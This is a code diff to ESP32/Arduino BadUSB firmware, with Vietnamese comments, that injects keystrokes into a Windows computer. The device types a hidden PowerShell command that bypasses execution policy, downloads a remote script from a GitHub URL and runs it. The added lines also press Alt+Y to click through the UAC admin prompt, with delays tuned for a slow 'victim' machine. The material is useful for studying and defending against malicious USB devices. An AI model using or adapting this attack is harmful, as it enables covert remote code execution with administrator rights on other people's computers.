@@ -32,29 +32,33 @@ void loop() {
     Keyboard.releaseAll();
     delay(500);
 
-    // 4. Execute PowerShell hidden with administrative privileges
-    // LƯU Ý: THAY <LINK> BẰNG ĐƯỜNG DẪN TỚI FILE ps.ps1 CỦA BẠN
-    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://github.com/Sunlaii/ANM-Esp32BadUSB/blob/MinhNhat/src/ps.ps1| iex\"");
+    // 4. Mở PowerShell quyền Admin
+    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://github.com/Sunlaii/ANM-Esp32BadUSB/blob/MinhNhat/src/ps.ps1 | iex\"");
     delay(200);
 
-    // Nhấn CTRL + SHIFT + ENTER để chạy bằng quyền Admin
+    // Nhấn CTRL + SHIFT + ENTER để chạy
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press(KEY_LEFT_SHIFT);
     Keyboard.press(KEY_RETURN);
     delay(100);
     Keyboard.releaseAll();
-    delay(1000);
 
-    // 5. Vượt qua hộp thoại UAC (User Account Control) của Windows
-    // Nhấn phím mũi tên Trái (để chọn Yes) rồi Enter
-    Keyboard.press(KEY_LEFT_ARROW);
-    delay(100);
-    Keyboard.releaseAll();
-    delay(500);
+    // ==========================================
+    // 5. VƯỢT QUA UAC (ĐÃ FIX LỖI)
+    // ==========================================
     
-    Keyboard.press(KEY_RETURN);
+    // TĂNG DELAY: Chờ 2.5 giây (hoặc 3 giây) để màn hình UAC hiện lên hoàn toàn
+    // Nếu máy nạn nhân chậm, bạn có thể tăng lên 3000 hoặc 4000
+    delay(2500); 
+
+    // Dùng tổ hợp phím ALT + Y để nhấn nút "Yes"
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('y');
     delay(100);
     Keyboard.releaseAll();
+    
+    // Đợi một chút cho PowerShell kịp khởi động sau khi cấp quyền
+    delay(1000);
 
     // 6. Flash CAPSLOCK as an indicator that execution is complete
     // Nháy đèn Caps Lock 4 lần để báo hiệu xong
